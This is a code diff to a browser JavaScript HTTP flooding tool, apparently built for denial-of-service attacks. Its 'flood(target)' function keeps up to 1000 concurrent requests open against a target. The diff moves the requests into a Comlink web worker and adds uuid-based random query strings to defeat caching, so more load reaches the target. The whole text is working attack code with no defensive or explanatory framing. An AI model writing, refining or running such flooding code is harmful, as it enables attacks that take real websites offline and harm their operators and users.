@@ -1,5 +1,15 @@
 var statsEl = document.getElementById('stats');
 
+
+import { Comlink } from '../node_modules/comlinkjs/comlink.es6.js';
+
+var uuid = require('uuid');
+
+var worker = new Worker('../node_modules/comlink-fetch/src/fetch.worker.js');
+
+var proxy = Comlink.proxy(worker);
+
+
 var CONCURRENCY_LIMIT = 1000;
 var queue = [];
 
@@ -17,12 +27,11 @@ setInterval(printStats, 1000);
 
 async function fetchWithTimeout(resource, options) {
   const controller = new AbortController();
+  const API = await new proxy.Fetch;
+  var rang = uuid.v4();
+  API.setBaseUrl(resource);
   const id = setTimeout(() => controller.abort(), options.timeout);
-  return fetch(resource, {
-    method: 'GET',
-    mode: 'no-cors',
-    signal: controller.signal,
-  }).then((response) => {
+  return API.get(`?${rang}`).then((response) => {
     clearTimeout(id);
     return response;
   }).catch((error) => {
@@ -36,9 +45,8 @@ async function flood(target) {
     if (queue.length > CONCURRENCY_LIMIT) {
       await queue.shift()
     }
-    rand = i % 3 === 0 ? '' : ('?' + Math.random() * 1000)
     queue.push(
-      fetchWithTimeout(target+rand, { timeout: 1000 })
+      fetchWithTimeout(target, { timeout: 1000 })
         .catch((error) => {
           if (error.code === 20 /* ABORT */) {
             return;
